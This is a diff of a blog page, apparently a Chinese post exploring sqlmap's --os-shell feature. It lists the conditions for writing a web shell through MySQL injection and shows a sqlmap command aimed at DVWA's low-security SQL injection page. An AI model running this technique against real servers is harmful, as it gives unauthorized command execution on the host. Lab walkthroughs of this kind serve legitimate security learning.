@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="1 条件  网站的绝对路径  mysql进程有网站绝对路径的写权限  mysql用户为root  mysql允许写[secure_file_priv]  GPC关闭  2 过程dvwa-low-sqli为例sqlmap -u &quot;http:&#x2F;&#x2F;ip&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;111&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&#39;PHP">
+    <meta name="description" content="1 条件  网站的绝对路径  mysql进程有网站绝对路径的写权限  mysql用户为root  mysql允许写[secure_file_priv]  GPC关闭  2 过程dvwa-low-sqli为例   1sqlmap -u &quot;http:&#x2F;&#x2F;ip&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;111&amp;Subm">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlmap os-shell探索">
 <meta property="og:url" content="http://aeolustf.github.io/2021/02/15/sqlmap-os-shell%E6%8E%A2%E7%B4%A2/index.html">
 <meta property="og:site_name" content="Ae0lu5">
-<meta property="og:description" content="1 条件  网站的绝对路径  mysql进程有网站绝对路径的写权限  mysql用户为root  mysql允许写[secure_file_priv]  GPC关闭  2 过程dvwa-low-sqli为例sqlmap -u &quot;http:&#x2F;&#x2F;ip&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;111&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&#39;PHP">
+<meta property="og:description" content="1 条件  网站的绝对路径  mysql进程有网站绝对路径的写权限  mysql用户为root  mysql允许写[secure_file_priv]  GPC关闭  2 过程dvwa-low-sqli为例   1sqlmap -u &quot;http:&#x2F;&#x2F;ip&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;111&amp;Subm">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://aeolustf.github.io/images/sqlmap-os-shell%E6%8E%A2%E7%B4%A2/1.png">
 <meta property="og:image" content="http://aeolustf.github.io/images/sqlmap-os-shell%E6%8E%A2%E7%B4%A2/2.png">
@@ -28,7 +28,7 @@
 <meta property="og:image" content="http://aeolustf.github.io/images/sqlmap-os-shell%E6%8E%A2%E7%B4%A2/13.png">
 <meta property="og:image" content="http://aeolustf.github.io/images/sqlmap-os-shell%E6%8E%A2%E7%B4%A2/14.png">
 <meta property="article:published_time" content="2021-02-14T18:21:57.000Z">
-<meta property="article:modified_time" content="2021-02-14T18:40:39.429Z">
+<meta property="article:modified_time" content="2021-02-14T19:10:20.899Z">
 <meta property="article:author" content="Ae0lu5">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://aeolustf.github.io/images/sqlmap-os-shell%E6%8E%A2%E7%B4%A2/1.png">
@@ -168,7 +168,8 @@
 <li> mysql允许写[secure_file_priv]</li>
 <li> GPC关闭</li>
 </ol>
-<h1 id="2-过程"><a href="#2-过程" class="headerlink" title="2 过程"></a>2 过程</h1><p>dvwa-low-sqli为例<br><code>sqlmap -u &quot;http://ip/vulnerabilities/sqli/?id=111&amp;Submit=Submit#&quot; --cookie=&#39;PHPSESSID=t875bj3h4imdvhk7vce834j075; security=low&#39; --os-shell</code></p>
+<h1 id="2-过程"><a href="#2-过程" class="headerlink" title="2 过程"></a>2 过程</h1><p>dvwa-low-sqli为例  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;ip&#x2F;vulnerabilities&#x2F;sqli&#x2F;?id&#x3D;111&amp;Submit&#x3D;Submit#&quot; --cookie&#x3D;&#39;PHPSESSID&#x3D;t875bj3h4imdvhk7vce834j075; security&#x3D;low&#39; --os-shell</span><br></pre></td></tr></table></figure>
 <p>sqlmap os-shell过程和关键选项</p>
 <ol>
 <li>sqlmap会识别数据库所在服务器的操作系统，然后让你选择web支持的脚本语言<br> <img src="/images/sqlmap-os-shell%E6%8E%A2%E7%B4%A2/1.png"></li>
